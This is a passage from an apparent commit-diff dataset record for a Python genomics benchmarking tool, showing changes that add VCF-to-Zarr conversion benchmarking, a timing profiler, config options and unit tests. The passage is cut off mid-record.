print(\"[Exec] Error: Invalid option supplied for benchmark data input format.\")\n+                    print(\"  - Expected data input formats: vcf, zarr\")\n+                    print(\"  - Provided data input format: {}\".format(self.bench_conf.benchmark_data_input))\n+                    exit(1)\n+\n+                # Ensure Zarr dataset exists and can be used for upcoming benchmarks\n+                benchmark_zarr_path = os.path.join(self.benchmark_zarr_dir, self.benchmark_zarr_file)\n+                if (benchmark_zarr_path != \"\") and (os.path.isdir(benchmark_zarr_path)):\n+                    # TODO: Run remaining benchmarks (e.g. loading into memory, allele counting, PCA, etc.)\n+                    pass\n+                else:\n+                    # Zarr dataset doesn't exist. Print error message and exit\n+                    print(\"[Exec] Error: Zarr dataset could not be found for benchmarking.\")\n+                    print(\"  - Zarr dataset location: {}\".format(benchmark_zarr_path))\n+\n+    def _benchmark_convert_to_zarr(self):\n+        self.benchmark_zarr_dir = self.data_dirs.zarr_dir_benchmark\n+        input_vcf_file = self.bench_conf.benchmark_dataset\n+        input_vcf_path = os.path.join(self.data_dirs.vcf_dir, input_vcf_file)\n+\n+        if os.path.isfile(input_vcf_path):\n+            output_zarr_file = input_vcf_file\n+            output_zarr_file = output_zarr_file[\n+                               0:len(output_zarr_file) - 4]  # Truncate *.vcf from input filename\n+            output_zarr_path = os.path.join(self.data_dirs.zarr_dir_benchmark, output_zarr_file)\n+\n+            data_service.convert_to_zarr(input_vcf_path=input_vcf_path,\n+                                         output_zarr_path=output_zarr_path,\n+                                         conversion_config=self.bench_conf.vcf_to_zarr_config,\n+                                         benchmark_runner=self.benchmark_profiler)\n+\n+            self.benchmark_zarr_file = output_zarr_file\n+        else:\n+            print(\"[Exec] Error: Dataset specified in configuration file does not exist. Exiting...\")\n+            print(\"  - Dataset file specified in configuration: {}\".format(input_vcf_file))\n+            print(\"  - Expected file location: {}\".format(input_vcf_path))\n+            exit(1)\ndiff --git a/benchmark/data_service.py b/benchmark/data_service.py\nindex 323ebd3..83e89cf 100644\n--- a/benchmark/data_service.py\n+++ b/benchmark/data_service.py\n@@ -15,8 +15,7 @@\n import numpy as np\n import zarr\n import numcodecs\n-from numcodecs import Blosc, LZ4, LZMA\n-from benchmark import config\n+from numcodecs import Blosc\n \n import gzip\n import shutil\n@@ -279,19 +278,25 @@ def setup_vcf_to_zarr(input_vcf_dir, output_zarr_dir, conversion_config):\n                         conversion_config=conversion_config)\n \n \n-def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):\n+def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config, benchmark_runner=None):\n     \"\"\" Converts the original data (VCF) to a Zarr format. Only converts a single VCF file.\n+    If a BenchmarkRunner is provided, the actual VCF to Zarr conversion process will be benchmarked.\n     :param input_vcf_path: The input VCF file location\n     :param output_zarr_path: The desired Zarr output location\n     :param conversion_config: Configuration data for the conversion\n+    :param benchmark_runner: BenchmarkRunner object to be used for benchmarking process\n     :type input_vcf_path: str\n     :type output_zarr_path: str\n     :type conversion_config: config.VCFtoZarrConfigurationRepresentation\n+    :type benchmark_runner: core.BenchmarkProfiler\n     \"\"\"\n     if conversion_config is not None:\n         # Ensure var is string, not pathlib.Path\n         output_zarr_path = str(output_zarr_path)\n \n+        # Get fields to extract (for unit testing only)\n+        fields = conversion_config.fields\n+\n         # Get alt number\n         if conversion_config.alt_number is None:\n             print(\"[VCF-Zarr] Determining maximum number of ALT alleles by scaling all variants in the VCF file.\")\n@@ -324,10 +329,42 @@ def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):\n         else:\n             raise ValueError(\"Unexpected compressor type specified.\")\n \n-        print(\"[VCF-Zarr] Using {} compressor.\".format(conversion_config.compressor))\n+        if benchmark_runner is not None:\n+            benchmark_runner.start_benchmark(operation_name=\"Convert VCF to Zarr\")\n \n-        print(\"[VCF-Zarr] Performing VCF to Zarr conversion...\")\n         # Perform the VCF to Zarr conversion\n-        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,\n+        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True, fields=fields,\n                           log=sys.stdout, compressor=compressor, chunk_length=chunk_length, chunk_width=chunk_width)\n-        print(\"[VCF-Zarr] Done.\")\n+\n+        if benchmark_runner is not None:\n+            benchmark_runner.end_benchmark()\n+\n+\n+GENOTYPE_ARRAY_NORMAL = 0\n+GENOTYPE_ARRAY_DASK = 1\n+GENOTYPE_ARRAY_CHUNKED = 2\n+\n+\n+def get_genotype_data(callset, genotype_array_type=GENOTYPE_ARRAY_DASK):\n+    genotype_ref_name = ''\n+\n+    # Ensure 'calldata' is within the callset\n+    if 'calldata' in callset:\n+        # Try to find either GT or genotype in calldata\n+        if 'GT' in callset['calldata']:\n+            genotype_ref_name = 'GT'\n+        elif 'genotype' in callset['calldata']:\n+            genotype_ref_name = 'genotype'\n+        else:\n+            return None\n+    else:\n+        return None\n+\n+    if genotype_array_type == GENOTYPE_ARRAY_NORMAL:\n+        return allel.GenotypeArray(callset['calldata'][genotype_ref_name])\n+    elif genotype_array_type == GENOTYPE_ARRAY_DASK:\n+        return allel.GenotypeDaskArray(callset['calldata'][genotype_ref_name])\n+    elif genotype_array_type == GENOTYPE_ARRAY_CHUNKED:\n+        return allel.GenotypeChunkedArray(callset['calldata'][genotype_ref_name])\n+    else:\n+        return None\ndiff --git a/doc/benchmark.conf b/doc/benchmark.conf\nindex 813a34a..75a82ac 100644\n--- a/doc/benchmark.conf\n+++ b/doc/benchmark.conf\n@@ -21,5 +21,12 @@ blosc_compression_algorithm = zstd\n blosc_compression_level = 1\n blosc_shuffle_mode = -1\n \n+[benchmark]\n+benchmark_number_runs = 5\n+benchmark_data_input = vcf\n+benchmark_dataset =\n+benchmark_allele_count = True\n+benchmark_PCA = False\n+\n [output]\n output_results = ~/benchmark/results.psv\ndiff --git a/doc/benchmark.conf.default b/doc/benchmark.conf.default\nindex c59a442..2310dc2 100644\n--- a/doc/benchmark.conf.default\n+++ b/doc/benchmark.conf.default\n@@ -4,7 +4,8 @@ run_mode = fetch_data\n \n [ftp]\n \n-# Whether or not the FTP downloader module should be used when running benchmark tool in Setup mode.\n+# Whether or not the FTP downloader module should be used when running benchmark\n+# tool in Setup mode.\n enabled = False\n \n # FTP Server to retrieve files from:\n@@ -22,7 +23,7 @@ use_tls = False\n directory = files\n \n # File or list of files to download within {directory}.\n-#  - If downloading list of files, names should be separated using \n+#  - If downloading list of files, names should be separated using\n #    delimiter specified in {file_delimiter}.\n #  - To download all files within {directory}, set {files} to \"*\" (without quotes).\n files = sample.vcf\n@@ -36,6 +37,8 @@ file_delimiter = |\n \n # Whether or not the VCF to Zarr Converter module should be used when running\n # benchmark tool in Setup mode.\n+# Note: To run VCF to Zarr conversion as part of the benchmark process, see\n+#       the [benchmark] configuration section.\n enabled = False\n \n # Alt number to assume when converting to Zarr format.\n@@ -76,5 +79,30 @@ blosc_compression_level = 1\n #   - AUTOSHUFFLE:  -1\n blosc_shuffle_mode = -1\n \n+[benchmark]\n+\n+# Specifies how many times the benchmark tool should run\n+# each available benchmark.\n+benchmark_number_runs = 5\n+\n+# Specifies where the benchmark tool should get its data from.\n+# Possible Values:\n+#   - vcf:  uses datasets within the ./data/vcf/ directory. This option will\n+#           result in VCF data being converted to Zarr format as part of the\n+#           benchmarking process.\n+#   - zarr: uses Zarr-formtted datasets within the ./data/zarr/ directory. This\n+#           option will result in skipping the benchmark of the VCF to Zarr\n+#           conversion process.\n+benchmark_data_input = vcf\n+\n+# Specifies which dataset to use for the benchmarking process.\n+benchmark_dataset =\n+\n+# Enables/disables running an allele count as part of the benchmarking process.\n+benchmark_allele_count = True\n+\n+# Enables Principal Component Analysis (PCA) as part of the benchmarking process.\n+benchmark_PCA = False\n+\n [output]\n output_results = ~/benchmark/results.psv\ndiff --git a/requirements.txt b/requirements.txt\nindex 29a9eb2..f749f85 100644\n--- a/requirements.txt\n+++ b/requirements.txt\n@@ -1,3 +1,4 @@\n scikit-allel\n perf\n-numcodecs\n\\ No newline at end of file\n+numcodecs\n+pandas\n\\ No newline at end of file\ndiff --git a/tests/test_cli.py b/tests/test_cli.py\nindex 8a1f926..d221651 100644\n--- a/tests/test_cli.py\n+++ b/tests/test_cli.py\n@@ -32,9 +32,7 @@ def test_getting_command_arguments(self):\n         # Test group 2 -- setup\n         self.run_subparser_test(\"setup\",\"config_file\",\"./benhcmark.conf\")  \n         # Test group 3 - Tests if it the argparser is setting default values \"\"\"\n-        self.run_subparser_test(\"exec\",\"config_file\",\"./benchmark.conf\")  \n-        # Test group 4 - Tests if it the argparser is setting default values \"\"\"\n-        self.run_subparser_test(\"exec\",\"config_file\",\"./benchmark.conf\",\"label\",\"run\")    \n+        self.run_subparser_test(\"exec\",\"config_file\",\"./benchmark.conf\")\n \n \n     def test_parser_expected_failing(self):\ndiff --git a/tests/test_core.py b/tests/test_core.py\nindex 10e6159..1775eec 100644\n--- a/tests/test_core.py\n+++ b/tests/test_core.py\n@@ -1 +1,127 @@\n import unittest\n+from benchmark.core import *\n+from time import sleep\n+import os\n+\n+\n+class TestCoreBenchmark(unittest.TestCase):\n+    def test_benchmark_profiler_results(self):\n+        # Setup Benchmark Profiler object\n+        profiler_label = 'test_benchmark_profiler_results'\n+        profiler = BenchmarkProfiler(profiler_label)\n+\n+        # Run a few mock benchmarks\n+        benchmark_times = [1, 2, 10]\n+        i = 1\n+        for benchmark_time in benchmark_times:\n+            profiler.set_run_number(i)\n+\n+            operation_name = 'Sleep {} seconds'.format(benchmark_time)\n+\n+            # Run the mock benchmark, measuring time to run sleep command\n+            profiler.start_benchmark(operation_name)\n+            time.sleep(benchmark_time)\n+            profiler.end_benchmark()\n+\n+            # Grab benchmark results\n+            results = profiler.get_benchmark_results()\n+            results_exec_time = int(results.exec_time)  # Convert to int to truncate decimals\n+            results_operation_name = results.operation_name\n+            results_run_number = results.run_number\n+\n+            # Ensure benchmark results match expected values\n+            self.assertEqual(benchmark_time, results_exec_time, msg='Execution time is incorrect.')\n+            self.assertEqual(operation_name, results_operation_name, msg='Operation name is incorrect.')\n+            self.assertEqual(i, results_run_number, msg='Run number is incorrect.')\n+\n+            i += 1\n+\n+        # Delete *.psv file created when running benchmark\n+        psv_file = '{}.psv'.format(profiler_label)\n+        if os.path.exists(psv_file):\n+            os.remove(psv_file)\n+\n+    def test_benchmark_results_psv(self):\n+        # Setup Benchmark Profiler object\n+        profiler_label = 'test_benchmark_results_psv'\n+\n+        # Delete *.psv file created from any previous unit testing\n+        psv_file = '{}.psv'.format(profiler_label)\n+        if os.path.exists(psv_file):\n+            os.remove(psv_file)\n+\n+        profiler = BenchmarkProfiler(profiler_label)\n+\n+        operation_name_format = 'Sleep {} seconds'\n+\n+        # Run a few mock benchmarks\n+        benchmark_times = [1, 2, 10]\n+        i = 1\n+        for benchmark_time in benchmark_times:\n+            profiler.set_run_number(i)\n+\n+            operation_name = operation_name_format.format(benchmark_time)\n+\n+            # Run the mock benchmark, measuring time to run sleep command\n+            profiler.start_benchmark(operation_name)\n+            time.sleep(benchmark_time)\n+            profiler.end_benchmark()\n+\n+            i += 1\n+\n+        # Read results psv file\n+        psv_file = '{}.psv'.format(profiler_label)\n+\n+        # Ensure psv file was created\n+        if os.path.exists(psv_file):\n+            # Read file contents\n+            with open(psv_file, 'r') as f:\n+                psv_lines = [line.rstrip('\\n') for line in f]\n+\n+            # Check line count of psv file. Line count should be equal to number of benchmarks run + 1 (for header)\n+            num_lines = len(psv_lines)\n+            num_lines_expected = len(benchmark_times) + 1\n+            self.assertEqual(num_lines_expected, num_lines, msg='Line count in resulting psv file is incorrect.')\n+\n+            # Ensure header (first line) of psv file is correct\n+            header_expected = 'Log Timestamp|Run Number|Operation|Execution Time'\n+            header_actual = psv_lines[0]\n+            self.assertEqual(header_expected, header_actual)\n+\n+            # Ensure contents (benchmark data) of psv file is correct\n+            i = 1\n+            for line_number in range(1, num_lines):\n+                content = psv_lines[line_number].split('|')\n+\n+                # Ensure column count is correct\n+                num_columns = len(content)\n+                num_columns_expected = 4\n+                self.assertEqual(num_columns_expected, num_columns, msg='Column count for psv data is incorrect.')\n+\n+                # Ensure run number is correct\n+                run_number_psv = int(content[1])\n+                run_number_expected = i\n+                self.assertEqual(run_number_expected, run_number_psv, msg='Run number is incorrect.')\n+\n+                # Ensure operation name is correct\n+                operation_name_psv = content[2]\n+                operation_name_expected = operation_name_format.format(benchmark_times[i - 1])\n+                self.assertEqual(operation_name_expected, operation_name_psv, msg='Operation name is incorrect.')\n+\n+                # Ensure execution time is correct\n+                execution_time_psv = int(float(content[3]))  # Convert to int to truncate decimals\n+                execution_time_expected = benchmark_times[i - 1]\n+                self.assertEqual(execution_time_expected, execution_time_psv, msg='Execution time is incorrect')\n+\n+                i += 1\n+\n+        else:\n+            self.fail(msg='Resulting psv file could not be found.')\n+\n+        # Delete *.psv file created when running benchmark\n+        if os.path.exists(psv_file):\n+            os.remove(psv_file)\n+\n+\n+if __name__ == \"__main__\":\n+    unittest.main()\ndiff --git a/tests/test_data_service.py b/tests/test_data_service.py\nindex d69decb..f9004d1 100644\n--- a/tests/test_data_service.py\n+++ b/tests/test_data_service.py\n@@ -142,6 +142,7 @@ def test_convert_to_zarr(self):\n         if os.path.isfile(input_vcf_path):\n             # Setup test settings for Zarr conversion\n             vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation()\n+            vcf_to_zarr_config.fields = 'variants/numalt'\n             vcf_to_zarr_config.enabled = True\n             vcf_to_zarr_config.compressor = \"Blosc\"\n             vcf_to_zarr_config.blosc_compression_algorithm = \"zstd\"\n", "files": {"/benchmark/cli.py": {"changes": [{"diff": "\n runs the benchmarks, and records the timer results. \"\"\"\n \n import argparse  # for command line parsing\n+import datetime\n import time  # for benchmark timer\n import csv  # for writing results\n import logging\n import sys\n import shutil\n-from benchmark import config, data_service\n+from benchmark import core, config, data_service\n \n \n def get_cli_arguments():\n", "add": 2, "remove": 1, "filename": "/benchmark/cli.py", "badparts": ["from benchmark import config, data_service"], "goodparts": ["import datetime", "from benchmark import core, config, data_service"]}, {"diff": "\n \n     benchmark_exec_parser = subparser.add_parser(\"exec\",\n                                                  help='Execution of the benchmark modes. It requires a configuration file.')\n-    # TODO: use run_(timestamp) as default\n-    benchmark_exec_parser.add_argument(\"--label\", type=str, default=\"run\", metavar=\"RUN_LABEL\",\n+\n+    timestamp_current = datetime.datetime.fromtimestamp(time.time())\n+    benchmark_label_default = \"run_{timestamp}\".format(timestamp=timestamp_current.strftime(\"%Y-%m-%d_%H-%M-%S\"))\n+    benchmark_exec_parser.add_argument(\"--label\", type=str, default=benchmark_label_default, metavar=\"RUN_LABEL\",\n                                        help=\"Label for the benchmark run.\")\n     benchmark_exec_parser.add_argument(\"--config_file\", type=str, required=True,\n                                        help=\"Specify the path to a configuration file.\", metavar=\"FILEPATH\")\n", "add": 4, "remove": 2, "filename": "/benchmark/cli.py", "badparts": ["    benchmark_exec_parser.add_argument(\"--label\", type=str, default=\"run\", metavar=\"RUN_LABEL\","], "goodparts": ["    timestamp_current = datetime.datetime.fromtimestamp(time.time())", "    benchmark_label_default = \"run_{timestamp}\".format(timestamp=timestamp_current.strftime(\"%Y-%m-%d_%H-%M-%S\"))", "    benchmark_exec_parser.add_argument(\"--label\", type=str, default=benchmark_label_default, metavar=\"RUN_LABEL\","]}, {"diff": "\n \n \n def _main():\n-    input_directory = \"./data/input/\"\n-    download_directory = input_directory + \"download/\"\n-    temp_directory = \"./data/temp/\"\n-    vcf_directory = \"./data/vcf/\"\n-    zarr_directory_setup = \"./data/zarr/\"\n-    zarr_directory_benchmark = \"./data/zarr_benchmark/\"\n+    data_dirs = config.DataDirectoriesConfigurationRepresentation()\n \n     cli_arguments = get_cli_arguments()\n \n", "add": 1, "remove": 6, "filename": "/benchmark/cli.py", "badparts": ["    input_directory = \"./data/input/\"", "    download_directory = input_directory + \"download/\"", "    temp_directory = \"./data/temp/\"", "    vcf_directory = \"./data/vcf/\"", "    zarr_directory_setup = \"./data/zarr/\"", "    zarr_directory_benchmark = \"./data/zarr_benchmark/\""], "goodparts": ["    data_dirs = config.DataDirectoriesConfigurationRepresentation()"]}, {"diff": "\n         print(\"[Setup] Setting up benchmark data.\")\n \n         # Clear out existing files in VCF and Zarr directories\n-        data_service.remove_directory_tree(vcf_directory)\n-        data_service.remove_directory_tree(zarr_directory_setup)\n+        data_service.remove_directory_tree(data_dirs.vcf_dir)\n+        data_service.remove_directory_tree(data_dirs.zarr_dir_setup)\n \n         # Get runtime config from specified location\n         runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n", "add": 2, "remove": 2, "filename": "/benchmark/cli.py", "badparts": ["        data_service.remove_directory_tree(vcf_directory)", "        data_service.remove_directory_tree(zarr_directory_setup)"], "goodparts": ["        data_service.remove_directory_tree(data_dirs.vcf_dir)", "        data_service.remove_directory_tree(data_dirs.zarr_dir_setup)"]}, {"diff": "\n \n         if ftp_config.enabled:\n             print(\"[Setup][FTP] FTP module enabled. Running FTP download...\")\n-            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)\n+            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=data_dirs.download_dir)\n         else:\n             print(\"[Setup][FTP] FTP module disabled. Skipping FTP download...\")\n \n         # Process/Organize downloaded files\n-        data_service.process_data_files(input_dir=input_directory,\n-                                        temp_dir=temp_directory,\n-                                        output_dir=vcf_directory)\n+        data_service.process_data_files(input_dir=data_dirs.input_dir,\n+                                        temp_dir=data_dirs.temp_dir,\n+                                        output_dir=data_dirs.vcf_dir)\n \n         # Convert VCF files to Zarr format if the module is enabled\n         vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n         if vcf_to_zarr_config.enabled:\n-            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,\n-                                           output_zarr_dir=zarr_directory_setup,\n+            data_service.setup_vcf_to_zarr(input_vcf_dir=data_dirs.vcf_dir,\n+                                           output_zarr_dir=data_dirs.zarr_dir_setup,\n                                            conversion_config=vcf_to_zarr_config)\n     elif command == \"exec\":\n         print(\"[Exec] Executing benchmark tool.\")\n \n+        # Clear out existing files in Zarr benchmark directory\n+        data_service.remove_directory_tree(data_dirs.zarr_dir_benchmark)\n+\n         # Get runtime config from specified location\n         runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n \n-        # Get VCF to Zarr conversion settings from runtime config\n-        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n+        benchmark_label = cli_arguments[\"label\"]\n+\n+        # Get Benchmark module settings from runtime config\n+        benchmark_config = config.BenchmarkConfigurationRepresentation(runtime_config)\n+\n+        # Setup the benchmark runner\n+        benchmark = core.Benchmark(bench_conf=benchmark_config, data_dirs=data_dirs, benchmark_label=benchmark_label)\n \n-        # TODO: Convert necessary VCF files to Zarr format\n-        # data_service.convert_to_zarr(\"./data/vcf/chr22.1000.vcf\", \"./data/zarr/chr22.1000.zarr\", vcf_to_zarr_config)\n+        # Run the benchmark\n+        benchmark.run_benchmark()\n     else:\n         print(\"Error: Unexpected command specified. Exiting...\")\n         sys.exit(1)", "add": 18, "remove": 10, "filename": "/benchmark/cli.py", "badparts": ["            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)", "        data_service.process_data_files(input_dir=input_directory,", "                                        temp_dir=temp_directory,", "                                        output_dir=vcf_directory)", "            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,", "                                           output_zarr_dir=zarr_directory_setup,", "        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)"], "goodparts": ["            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=data_dirs.download_dir)", "        data_service.process_data_files(input_dir=data_dirs.input_dir,", "                                        temp_dir=data_dirs.temp_dir,", "                                        output_dir=data_dirs.vcf_dir)", "            data_service.setup_vcf_to_zarr(input_vcf_dir=data_dirs.vcf_dir,", "                                           output_zarr_dir=data_dirs.zarr_dir_setup,", "        data_service.remove_directory_tree(data_dirs.zarr_dir_benchmark)", "        benchmark_label = cli_arguments[\"label\"]", "        benchmark_config = config.BenchmarkConfigurationRepresentation(runtime_config)", "        benchmark = core.Benchmark(bench_conf=benchmark_config, data_dirs=data_dirs, benchmark_label=benchmark_label)", "        benchmark.run_benchmark()"]}], "source": "\n\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, determines the runtime mode(dynamic vs. static); if dynamic, gets the benchmark data from the server, runs the benchmarks, and records the timer results. \"\"\" import argparse import time import csv import logging import sys import shutil from benchmark import config, data_service def get_cli_arguments(): \"\"\" Returns command line arguments. Returns: args object from an ArgumentParses for fetch data(boolean, from a server), label(optional, for naming the benchmark run), and config argument for where is the config file. \"\"\" logging.debug('Getting cli arguments') parser=argparse.ArgumentParser(description=\"A benchmark for genomics routines in Python.\") subparser=parser.add_subparsers(title=\"commands\", dest=\"command\") subparser.required=True config_parser=subparser.add_parser(\"config\", help='Setting up the default configuration of the benchmark. It creates the default configuration file.') config_parser.add_argument(\"--output_config\", type=str, required=True, help=\"Specify the output path to a configuration file.\", metavar=\"FILEPATH\") config_parser.add_argument(\"-f\", action=\"store_true\", help=\"Overwrite the destination file if it already exists.\") data_setup_parser=subparser.add_parser(\"setup\", help='Preparation and setting up of the data for the benchmark. It requires a configuration file.') data_setup_parser.add_argument(\"--config_file\", required=True, help=\"Location of the configuration file\", metavar=\"FILEPATH\") benchmark_exec_parser=subparser.add_parser(\"exec\", help='Execution of the benchmark modes. It requires a configuration file.') benchmark_exec_parser.add_argument(\"--label\", type=str, default=\"run\", metavar=\"RUN_LABEL\", help=\"Label for the benchmark run.\") benchmark_exec_parser.add_argument(\"--config_file\", type=str, required=True, help=\"Specify the path to a configuration file.\", metavar=\"FILEPATH\") runtime_configuration=vars(parser.parse_args()) return runtime_configuration def _main(): input_directory=\"./data/input/\" download_directory=input_directory +\"download/\" temp_directory=\"./data/temp/\" vcf_directory=\"./data/vcf/\" zarr_directory_setup=\"./data/zarr/\" zarr_directory_benchmark=\"./data/zarr_benchmark/\" cli_arguments=get_cli_arguments() command=cli_arguments[\"command\"] if command==\"config\": output_config_location=cli_arguments[\"output_config\"] overwrite_mode=cli_arguments[\"f\"] config.generate_default_config_file(output_location=output_config_location, overwrite=overwrite_mode) elif command==\"setup\": print(\"[Setup] Setting up benchmark data.\") data_service.remove_directory_tree(vcf_directory) data_service.remove_directory_tree(zarr_directory_setup) runtime_config=config.read_configuration(location=cli_arguments[\"config_file\"]) ftp_config=config.FTPConfigurationRepresentation(runtime_config) if ftp_config.enabled: print(\"[Setup][FTP] FTP module enabled. Running FTP download...\") data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory) else: print(\"[Setup][FTP] FTP module disabled. Skipping FTP download...\") data_service.process_data_files(input_dir=input_directory, temp_dir=temp_directory, output_dir=vcf_directory) vcf_to_zarr_config=config.VCFtoZarrConfigurationRepresentation(runtime_config) if vcf_to_zarr_config.enabled: data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory, output_zarr_dir=zarr_directory_setup, conversion_config=vcf_to_zarr_config) elif command==\"exec\": print(\"[Exec] Executing benchmark tool.\") runtime_config=config.read_configuration(location=cli_arguments[\"config_file\"]) vcf_to_zarr_config=config.VCFtoZarrConfigurationRepresentation(runtime_config) else: print(\"Error: Unexpected command specified. Exiting...\") sys.exit(1) def main(): try: _main() except KeyboardInterrupt: print(\"Program interrupted. Exiting...\") sys.exit(1) ", "sourceWithComments": "\"\"\" Main module for the benchmark. It reads the command line arguments, reads the benchmark configuration, \ndetermines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,\nruns the benchmarks, and records the timer results. \"\"\"\n\nimport argparse  # for command line parsing\nimport time  # for benchmark timer\nimport csv  # for writing results\nimport logging\nimport sys\nimport shutil\nfrom benchmark import config, data_service\n\n\ndef get_cli_arguments():\n    \"\"\" Returns command line arguments. \n\n    Returns:\n    args object from an ArgumentParses for fetch data (boolean, from a server), label (optional, for naming the benchmark run), \n    and config argument for where is the config file. \"\"\"\n\n    logging.debug('Getting cli arguments')\n\n    parser = argparse.ArgumentParser(description=\"A benchmark for genomics routines in Python.\")\n\n    # Enable three exclusive groups of options (using subparsers)\n    # https://stackoverflow.com/questions/17909294/python-argparse-mutual-exclusive-group/17909525\n\n    subparser = parser.add_subparsers(title=\"commands\", dest=\"command\")\n    subparser.required = True\n\n    config_parser = subparser.add_parser(\"config\",\n                                         help='Setting up the default configuration of the benchmark. It creates the default configuration file.')\n    config_parser.add_argument(\"--output_config\", type=str, required=True,\n                               help=\"Specify the output path to a configuration file.\", metavar=\"FILEPATH\")\n    config_parser.add_argument(\"-f\", action=\"store_true\", help=\"Overwrite the destination file if it already exists.\")\n\n    data_setup_parser = subparser.add_parser(\"setup\",\n                                             help='Preparation and setting up of the data for the benchmark. It requires a configuration file.')\n    data_setup_parser.add_argument(\"--config_file\", required=True, help=\"Location of the configuration file\",\n                                   metavar=\"FILEPATH\")\n\n    benchmark_exec_parser = subparser.add_parser(\"exec\",\n                                                 help='Execution of the benchmark modes. It requires a configuration file.')\n    # TODO: use run_(timestamp) as default\n    benchmark_exec_parser.add_argument(\"--label\", type=str, default=\"run\", metavar=\"RUN_LABEL\",\n                                       help=\"Label for the benchmark run.\")\n    benchmark_exec_parser.add_argument(\"--config_file\", type=str, required=True,\n                                       help=\"Specify the path to a configuration file.\", metavar=\"FILEPATH\")\n\n    runtime_configuration = vars(parser.parse_args())\n    return runtime_configuration\n\n\ndef _main():\n    input_directory = \"./data/input/\"\n    download_directory = input_directory + \"download/\"\n    temp_directory = \"./data/temp/\"\n    vcf_directory = \"./data/vcf/\"\n    zarr_directory_setup = \"./data/zarr/\"\n    zarr_directory_benchmark = \"./data/zarr_benchmark/\"\n\n    cli_arguments = get_cli_arguments()\n\n    command = cli_arguments[\"command\"]\n    if command == \"config\":\n        output_config_location = cli_arguments[\"output_config\"]\n        overwrite_mode = cli_arguments[\"f\"]\n        config.generate_default_config_file(output_location=output_config_location,\n                                            overwrite=overwrite_mode)\n    elif command == \"setup\":\n        print(\"[Setup] Setting up benchmark data.\")\n\n        # Clear out existing files in VCF and Zarr directories\n        data_service.remove_directory_tree(vcf_directory)\n        data_service.remove_directory_tree(zarr_directory_setup)\n\n        # Get runtime config from specified location\n        runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n\n        # Get FTP module settings from runtime config\n        ftp_config = config.FTPConfigurationRepresentation(runtime_config)\n\n        if ftp_config.enabled:\n            print(\"[Setup][FTP] FTP module enabled. Running FTP download...\")\n            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)\n        else:\n            print(\"[Setup][FTP] FTP module disabled. Skipping FTP download...\")\n\n        # Process/Organize downloaded files\n        data_service.process_data_files(input_dir=input_directory,\n                                        temp_dir=temp_directory,\n                                        output_dir=vcf_directory)\n\n        # Convert VCF files to Zarr format if the module is enabled\n        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n        if vcf_to_zarr_config.enabled:\n            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,\n                                           output_zarr_dir=zarr_directory_setup,\n                                           conversion_config=vcf_to_zarr_config)\n    elif command == \"exec\":\n        print(\"[Exec] Executing benchmark tool.\")\n\n        # Get runtime config from specified location\n        runtime_config = config.read_configuration(location=cli_arguments[\"config_file\"])\n\n        # Get VCF to Zarr conversion settings from runtime config\n        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)\n\n        # TODO: Convert necessary VCF files to Zarr format\n        # data_service.convert_to_zarr(\"./data/vcf/chr22.1000.vcf\", \"./data/zarr/chr22.1000.zarr\", vcf_to_zarr_config)\n    else:\n        print(\"Error: Unexpected command specified. Exiting...\")\n        sys.exit(1)\n\n\ndef main():\n    try:\n        _main()\n    except KeyboardInterrupt:\n        print(\"Program interrupted. Exiting...\")\n        sys.exit(1)\n"}, "/benchmark/core.py": {"changes": [{"diff": "\n determines the runtime mode (dynamic vs. static); if dynamic, gets the benchmark data from the server,\n runs the benchmarks, and records the timer results. \"\"\"\n \n+import allel\n+import zarr\n+import datetime\n import time  # for benchmark timer\n import csv  # for writing results\n import logging\n+import os\n+import pandas as pd\n+from collections import OrderedDict\n+from benchmark import config, data_service\n \n \n-def run_benchmark(bench_conf):\n-    pass\n+class BenchmarkResultsData:\n+    run_number = None\n+    operation_name = None\n+    start_time = None\n+    exec_time = None\n \n+    def to_dict(self):\n+        return OrderedDict([(\"Log Timestamp\", datetime.datetime.fromtimestamp(self.start_time)),\n+                            (\"Run Number\", self.run_number),\n+                            (\"Operation\", self.operation_name),\n+                            (\"Execution Time\", self.exec_time)])\n \n-def run_dynamic(ftp_location):\n-    pass\n+    def to_pandas(self):\n+        data = self.to_dict()\n+        df = pd.DataFrame(data, index=[1])\n+        df.index.name = '#'\n+        return df\n \n \n-def run_static():\n-    pass\n+class BenchmarkProfiler:\n+    benchmark_running = False\n \n+    def __init__(self, benchmark_label):\n+        self.results = BenchmarkResultsData()\n+        self.benchmark_label = benchmark_label\n \n-def get_remote_files(ftp_server, ftp_directory, files=None):\n-    pass\n+    def set_run_number(self, run_number):\n+        if not self.benchmark_running:\n+            self.results.run_number = run_number\n \n+    def start_benchmark(self, operation_name):\n+        if not self.benchmark_running:\n+            self.results.operation_name = operation_name\n \n-def record_runtime(benchmark, timestamp):\n-    pass\n+            self.benchmark_running = True\n \n+            # Start the benchmark timer\n+            self.results.start_time = time.time()\n \n-# temporary here\n-def main():\n-    pass\n+    def end_benchmark(self):\n+        if self.benchmark_running:\n+            end_time = time.time()\n+\n+            # Calculate the execution 